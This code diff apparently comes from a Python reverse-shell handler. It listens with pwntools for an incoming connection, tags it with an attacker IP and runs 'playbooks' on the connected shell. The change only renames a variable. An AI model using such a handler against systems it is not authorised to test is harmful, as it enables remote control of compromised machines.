@@ -30,8 +30,8 @@ def main():
     pwn.context.log_level = 'error'
     with pwn.listen(args.port).wait_for_connection() as client:
         print('Connected!')
-        socket_wrapper = pwnlib_socket_wrapper.PwnlibSocketWrapper(client, EXPECTED_PROMPT, attacker_ip)
-        shell = pheelshell.Pheelshell(socket_wrapper)
+        socket = pwnlib_socket_wrapper.PwnlibSocketWrapper(client, EXPECTED_PROMPT, attacker_ip)
+        shell = pheelshell.Pheelshell(socket)
 
         for playbook in active_playbooks:
             shell.run_playbook(playbook)
